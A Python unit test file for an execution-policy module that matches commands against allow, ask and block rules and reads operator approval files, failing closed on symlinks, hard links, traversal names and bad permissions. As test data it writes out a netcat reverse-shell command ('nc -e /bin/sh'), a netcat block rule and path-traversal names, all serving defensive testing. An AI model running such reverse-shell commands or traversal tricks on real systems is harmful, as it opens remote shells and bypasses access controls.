"""Operator execution policy and approval decisions read by the root dispatcher."""
import importlib.util
import json
import os
import tempfile
import threading
import time
import unittest
from pathlib import Path

CONTAINER = Path(__file__).resolve().parents[1] / "container"
JOB = "job-20261118-120000-0a1b2c3d"
APPROVAL = "0123456789abcdef0123456789abcdef"
POSIX_ROOT = os.name == "posix" and hasattr(os, "geteuid") and os.geteuid() == 0
needs_root = unittest.skipUnless(POSIX_ROOT, "requires Linux root for ownership checks")


def load_policy_module():
    spec = importlib.util.spec_from_file_location(
        "re_container_execpolicy", CONTAINER / "execpolicy.py")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def policy_bytes(**overrides):
    body = {"v": 1, "default_action": "allow", "approval_timeout_s": 60, "rules": [
        {"id": "r1", "name": "Ask for shells", "enabled": True, "priority": 10,
         "match": "program", "value": "sh", "action": "ask"},
        {"id": "r2", "name": "Block netcat", "enabled": True, "priority": 50,
         "match": "contains", "value": "NC -e", "action": "block"},
        {"id": "r3", "name": "Allow file", "enabled": True, "priority": 50,
         "match": "prefix", "value": "file /job/in", "action": "allow"},
        {"id": "r4", "name": "Disabled", "enabled": False, "priority": 999,
         "match": "contains", "value": "/", "action": "block"},
    ]}
    body.update(overrides)
    return json.dumps(body).encode()


class ParseAndEvaluateTests(unittest.TestCase):
    def setUp(self):
        self.policy = load_policy_module()

    def test_rules_are_ordered_by_priority_then_file_order(self):
        policy = self.policy.parse_policy(policy_bytes())
        self.assertEqual([rule.name for rule in policy.rules],
                         ["Disabled", "Block netcat", "Allow file", "Ask for shells"])
        self.assertEqual(policy.approval_timeout_s, 60)

    def test_first_enabled_match_wins_and_default_applies(self):
        policy = self.policy.parse_policy(policy_bytes())
        evaluate = self.policy.evaluate
        self.assertEqual(evaluate(policy, ["/bin/sh", "-c", "id"]), ("ask", "Ask for shells"))
        self.assertEqual(evaluate(policy, ["sh", "-c", "nc -e /bin/sh x 1"]),
                         ("block", "Block netcat"))
        self.assertEqual(evaluate(policy, ["file", "/job/in/tool"]), ("allow", "Allow file"))
        self.assertEqual(evaluate(policy, ["/job/in/tool", "--version"]), ("allow", None))
        strict = self.policy.parse_policy(policy_bytes(default_action="block"))
        self.assertEqual(evaluate(strict, ["/job/in/tool"]), ("block", None))

    def test_contains_sees_the_whole_command_line(self):
        policy = self.policy.parse_policy(policy_bytes())
        padded = ["sh", "-c", "x" * 2_000_000 + " nc -e /bin/sh"]
        self.assertEqual(self.policy.evaluate(policy, padded)[0], "block")

    def test_program_match_uses_the_exact_basename(self):
        policy = self.policy.parse_policy(policy_bytes())
        self.assertEqual(self.policy.evaluate(policy, ["/usr/bin/bash", "-c", "x"]),
                         ("allow", None))
        self.assertEqual(self.policy.evaluate(policy, ["/tmp/sh"]), ("ask", "Ask for shells"))

    def test_invalid_documents_are_refused(self):
        cases = [
            b"not json", b"[]", json.dumps({"v": 2}).encode(),
            policy_bytes(extra=True), policy_bytes(default_action="maybe"),
            policy_bytes(approval_timeout_s=5), policy_bytes(approval_timeout_s=True),
            policy_bytes(rules={}),
            policy_bytes(rules=[{"name": "x", "match": "regex", "value": "a", "action": "block"}]),
            policy_bytes(rules=[{"name": "x", "match": "contains", "value": "a\nb",
                                 "action": "block"}]),
            policy_bytes(rules=[{"name": "x", "match": "contains", "value": "a",
                                 "action": "block", "priority": True}]),
            policy_bytes(rules=[{"name": "x", "match": "contains", "value": "a",
                                 "action": "block", "shell": "rm"}]),
            policy_bytes(rules=[{"name": "", "match": "contains", "value": "a",
                                 "action": "block"}]),
            policy_bytes(rules=[{"name": "x", "match": "contains", "value": "a" * 257,
                                 "action": "block"}]),
            policy_bytes(rules=[{"name": "x", "match": "contains", "value": "a",
                                 "action": "block"}] * 201),
        ]
        for data in cases:
            with self.subTest(data=data[:60]), self.assertRaises(self.policy.PolicyError):
                self.policy.parse_policy(data)


@needs_root
class ConsoleFileTests(unittest.TestCase):
    def setUp(self):
        self.policy = load_policy_module()
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.console = Path(self.tmp.name) / "console"
        self.console.mkdir(mode=0o750)
        os.chmod(self.console, 0o750)
        self.uid = os.geteuid()

    def write(self, name, data, mode=0o640):
        path = self.console / name
        path.write_bytes(data)
        os.chmod(path, mode)
        return path

    def test_no_console_uid_or_no_files_allows_everything(self):
        self.assertIs(self.policy.load_policy(self.console, None), self.policy.ALLOW_ALL)
        self.assertIs(self.policy.load_policy(self.console, self.uid), self.policy.ALLOW_ALL)
        self.assertIs(self.policy.load_policy(self.console / "missing", self.uid),
                      self.policy.ALLOW_ALL)

    def test_valid_policy_file_is_loaded(self):
        self.write("exec-policy.json", policy_bytes())
        policy = self.policy.load_policy(self.console, self.uid)
        self.assertEqual(len(policy.rules), 4)

    def test_untrusted_policy_files_fail_closed(self):
        outside = Path(self.tmp.name) / "outside.json"
        outside.write_bytes(policy_bytes())
        cases = {
            "symlink": lambda: os.symlink(outside, self.console / "exec-policy.json"),
            "group-writable": lambda: self.write("exec-policy.json", policy_bytes(), 0o660),
            "foreign-owner": lambda: os.chown(
                self.write("exec-policy.json", policy_bytes()), 12345, 12345),
            "hard-link": lambda: os.link(outside, self.console / "exec-policy.json"),
            "fifo": lambda: os.mkfifo(self.console / "exec-policy.json"),
            "invalid": lambda: self.write("exec-policy.json", b"{"),
        }
        for name, plant in cases.items():
            with self.subTest(name):
                (self.console / "exec-policy.json").unlink(missing_ok=True)
                plant()
                started = time.monotonic()
                with self.assertRaises(self.policy.PolicyError):
                    self.policy.load_policy(self.console, self.uid)
                self.assertLess(time.monotonic() - started, 2)

    def test_group_writable_console_dir_is_refused(self):
        self.write("exec-policy.json", policy_bytes())
        os.chmod(self.console, 0o770)
        with self.assertRaises(self.policy.PolicyError):
            self.policy.load_policy(self.console, self.uid)

    def approval_path(self):
        directory = self.console / "approvals" / JOB
        directory.mkdir(parents=True, exist_ok=True)
        for path in (self.console / "approvals", directory):
            os.chmod(path, 0o750)
        return directory / "run1.json"

    def test_decision_is_read_once_and_must_match_the_approval_id(self):
        read = self.policy.read_decision
        self.assertIsNone(read(self.console, self.uid, JOB, "run1.json", APPROVAL))
        path = self.approval_path()
        path.write_text(json.dumps({"approval_id": APPROVAL, "decision": "approve",
                                    "note": "ok\x1b[31m"}), encoding="utf-8")
        os.chmod(path, 0o640)
        decision = read(self.console, self.uid, JOB, "run1.json", APPROVAL)
        self.assertEqual((decision.decision, decision.source), ("approve", "operator"))
        self.assertEqual(decision.note, "ok[31m")
        self.assertFalse(path.exists())
        path.write_text(json.dumps({"approval_id": "f" * 32, "decision": "approve"}),
                        encoding="utf-8")
        os.chmod(path, 0o640)
        stale = read(self.console, self.uid, JOB, "run1.json", APPROVAL)
        self.assertEqual((stale.decision, stale.source), ("deny", "invalid"))

    def test_symlinked_decision_is_a_denial(self):
        path = self.approval_path()
        target = Path(self.tmp.name) / "approve.json"
        target.write_text(json.dumps({"approval_id": APPROVAL, "decision": "approve"}),
                          encoding="utf-8")
        os.symlink(target, path)
        decision = self.policy.read_decision(self.console, self.uid, JOB, "run1.json", APPROVAL)
        self.assertEqual(decision.decision, "deny")

    def test_discard_removes_a_stale_decision(self):
        path = self.approval_path()
        path.write_text("{}", encoding="utf-8")
        self.policy.discard_decision(self.console, self.uid, JOB, "run1.json")
        self.assertFalse(path.exists())
        self.policy.discard_decision(self.console, self.uid, JOB, "run1.json")

    def test_wait_times_out_or_stops_as_a_denial(self):
        timed_out = self.policy.wait_for_decision(
            self.console, self.uid, JOB, "run1.json", APPROVAL, 0.2, poll_s=0.05)
        self.assertEqual((timed_out.decision, timed_out.source), ("deny", "timeout"))
        stop = threading.Event()
        stop.set()
        cancelled = self.policy.wait_for_decision(
            self.console, self.uid, JOB, "run1.json", APPROVAL, 30, stop, poll_s=0.05)
        self.assertEqual((cancelled.decision, cancelled.source), ("deny", "cancelled"))

    def test_wait_returns_the_operator_decision(self):
        path = self.approval_path()

        def decide():
            time.sleep(0.1)
            path.write_text(json.dumps({"approval_id": APPROVAL, "decision": "deny"}),
                            encoding="utf-8")
            os.chmod(path, 0o640)

        worker = threading.Thread(target=decide)
        worker.start()
        decision = self.policy.wait_for_decision(
            self.console, self.uid, JOB, "run1.json", APPROVAL, 5, poll_s=0.02)
        worker.join()
        self.assertEqual((decision.decision, decision.source), ("deny", "operator"))

    def test_names_are_validated(self):
        with self.assertRaises(self.policy.PolicyError):
            self.policy.read_decision(self.console, self.uid, "../x", "run1.json", APPROVAL)
        with self.assertRaises(self.policy.PolicyError):
            self.policy.read_decision(self.console, self.uid, JOB, "../run1.json", APPROVAL)
        with self.assertRaises(self.policy.PolicyError):
            self.policy.wait_for_decision(self.console, self.uid, JOB, "run1.json", "x", 1)


if __name__ == "__main__":
    unittest.main()
